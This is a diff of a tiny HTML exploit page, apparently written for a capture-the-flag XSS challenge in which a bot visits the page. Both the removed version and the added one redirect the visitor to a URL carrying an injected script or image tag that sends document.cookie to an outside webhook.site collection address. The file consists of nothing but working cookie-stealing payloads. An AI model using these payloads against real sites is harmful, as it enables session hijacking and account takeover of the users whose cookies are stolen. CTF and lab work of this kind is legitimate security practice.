@@ -1,15 +1,5 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Exploit</title>
-</head>
-<body>
-  <script>
-    // We'll redirect the bot to a URL on the challenge domain that might be vulnerable to XSS
-    // The URL format will depend on how the application processes parameters
-    
-    // Let's try a few common XSS injection points
-    window.location = '/?xss=<img src="https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?cookie=" + document.cookie + ">';
-  </script>
+<body onload="window.location='http://' + window.location.hostname + ':' + window.location.port + '/?param=<script>fetch(\"https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?flag=\" + document.cookie)</script>'">
 </body>
 </html>
